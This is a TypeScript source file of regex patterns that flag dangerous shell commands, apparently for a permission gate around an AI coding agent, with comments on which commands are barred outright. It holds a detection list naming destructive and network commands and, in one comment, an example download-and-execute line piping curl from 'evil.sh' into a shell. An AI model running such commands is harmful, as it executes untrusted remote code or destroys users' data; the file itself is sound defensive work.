// ── Regex-based dangerous patterns (safety net alongside token analysis) ──
//
// Two categories:
//   dangerousCommandPatterns — tested against the first word (command name) of each segment.
//     These match commands that are inherently dangerous regardless of arguments.
//   dangerousContextPatterns — tested against the full segment text.
//     These need specific flags/args context (e.g. "apt install", "bash -c").
//
// The split prevents false positives when dangerous-sounding words appear in
// command arguments (e.g. "grep rm file.txt" should NOT match "rm").

/** Command-name patterns — tested against the first word only (avoids matching arguments). */
export const dangerousCommandPatterns: { pattern: RegExp; label: string; absolute?: boolean }[] = [
  { pattern: /^rm$/, label: "rm (any file deletion)" },
  { pattern: /^(?:chmod|chown)$/i, label: "chmod/chown (permission change)" },
  { pattern: /^mkfs/i, label: "mkfs (filesystem creation)", absolute: true },
  { pattern: /^mount$/i, label: "mount", absolute: true },
  { pattern: /^python[\d.]*$/, label: "python (script execution)" },
  { pattern: /^uv$/, label: "uv (python package manager)" },
  { pattern: /^node$/, label: "node (script execution)" },
  { pattern: /^ruby$/, label: "ruby (script execution)" },
  { pattern: /^php$/, label: "php (script execution)" },
  { pattern: /^lua$/, label: "lua (script execution)" },
  { pattern: /^truncate$/i, label: "truncate (in-place size change, can erase contents)" },
  { pattern: /^eval$/i, label: "eval", absolute: true },
  { pattern: /^(?:kill|pkill|killall)$/i, label: "kill" },
  { pattern: /^crontab$/i, label: "crontab" },
  { pattern: /^nohup$/i, label: "nohup" },
  { pattern: /^screen$/i, label: "screen" },
  { pattern: /^ssh$/i, label: "ssh" },
  { pattern: /^(?:scp|rsync)$/i, label: "scp/rsync" },
  { pattern: /^(?:curl|wget)$/i, label: "curl/wget (network access)" },
  { pattern: /^(?:rmdir|unlink|mv|cp)$/i, label: "rmdir/unlink/mv/cp (file modification)" },
  { pattern: /^(?:patch|install|ln)$/i, label: "patch/install/ln (file modification)" },
  { pattern: /^tee$/i, label: "tee (file writing)" },
  { pattern: /^(?:tar|zip|unzip|gzip|gunzip)$/i, label: "tar/zip/unzip/gzip/gunzip (archive operations)" },
  { pattern: /^(?:yarn|cargo|go)$/i, label: "yarn/cargo/go (package manager/build)" },
  { pattern: /^(?:shutdown|reboot)$/i, label: "shutdown/reboot (system power)", absolute: true },
  { pattern: /^systemctl$/i, label: "systemctl (service management)" },
];

/** Context-dependent patterns — tested against the full segment text (need flags/args context). */
export const dangerousContextPatterns: { pattern: RegExp; label: string; absolute?: boolean }[] = [
  { pattern: /\b(?:apt|yum|dnf|pip|npm|uv)\s+install\b/i, label: "package install" },
  { pattern: /\bdd\b\s+(?:\S+\s+)*?(?:if|of)=/i, label: "dd (raw disk access)", absolute: true },
  { pattern: /\bbash\s+-[ic]\b/i, label: "bash interactive/command" },
  { pattern: /\bsource\b.*\.(?:env|bashrc|profile|secret|local)\b/i, label: "source (config loading)" },
  // Retained for risk analysis — already caught by specific checks in isSegmentUnsafe
  { pattern: /\bperl\b.*\s-[a-bd-zA-Z]*i[^\s/]*(?:\s|$)/i, label: "perl -i (in-place file modification)" },
  { pattern: /\bsed\b.*\s-[a-bd-gj-zA-Z]*i[^\s/]*(?:\s|$)/i, label: "sed -i (in-place file modification)" },
  { pattern: /\bsed\s+--in-place\b/i, label: "sed --in-place (in-place file modification)" },
  { pattern: /\bgit\s+push\s+.*--force\b/i, label: "git push --force", absolute: true },
  { pattern: /\bgit\s+reset\s+.*--hard\b/i, label: "git reset --hard", absolute: true },
  // The flag cluster must be matched as a cluster: `.*-[fdx]\b` never fires on
  // the common `-fdx` (after `-f` the following `d` breaks the word boundary and
  // there is no second dash to retry) — found by the D-b probe 2026-10-19. The
  // lookahead keeps a dry run (`-n` anywhere in the cluster, or `--dry-run`)
  // judgeable: it deletes nothing.
  { pattern: /\bgit\s+clean\b(?![^|\n]*(?:\s-[a-zA-Z]*n[a-zA-Z]*\b|\s--dry-run))[^|\n]*\s-[a-zA-Z]*[fdx]/i, label: "git clean (can delete untracked files)", absolute: true },
  // Download-and-execute remote code (curl/wget piped into a shell interpreter or eval).
  // The label's tail phrase is load-bearing: gate/dspa-gate.ts exempts this bar
  // when the fetch is loopback-proven (a local API answer parsed by python3 is
  // not remote code) — keep "download & execute" in the label if you reword it.
  // Matches the raw pattern anywhere in the segment text, so it also catches
  // `echo "$(curl http://evil.sh | sh)"` where curl|sh lives inside a substitution.
  { pattern: /\b(?:curl|wget)\b[\s\S]*?\|\s*(?:sh|bash|zsh|fish|ksh|dash|tcsh|csh|python[\d.]*|perl|ruby|node|php|lua|eval)\b/i, label: "curl/wget | interpreter (download & execute remote code)", absolute: true },
];

/**
 * `absolute: true` marks the entries whose bar is ABSOLUTE — the floor stops
 * them no matter what the judge says (docs/dspa-intent-floor.md D-g: locations
 * are judged, bars are absolute). Everything else in these two tables is a
 * CLASS label: it tells the judge and the user what kind of operation this is,
 * and /dspa judges it (D1 — the packet carries the full command text).
 *
 * The flag is per ENTRY because the class is shared while the bar is not:
 * `curl … https://…` is an ordinary fetch, `curl … | sh` runs remote code; both
 * live under one class. `mkfs`, `mount`, `dd`, `shutdown`/`reboot`, `eval`, the
 * irreversible git forms (`push --force`, `reset --hard`, `clean -fdx`) and
 * download-and-execute destroy state the user cannot walk back or that escapes
 * the permission model entirely — none of them is a location question, so the
 * intent path has nothing to rule on.
 *
 * Not flagged on purpose: script interpreters, `sed -i`/`perl -i`, package
 * managers, `kill`, `ssh`, `systemctl`, `crontab`, `tar`/`cp`/`mv`, `truncate` —
 * their effect is a location (the write bar catches the out-of-bar case, D-d)
 * or reversible content. `rm` has its own branch (`checkRmTargets`).
 */


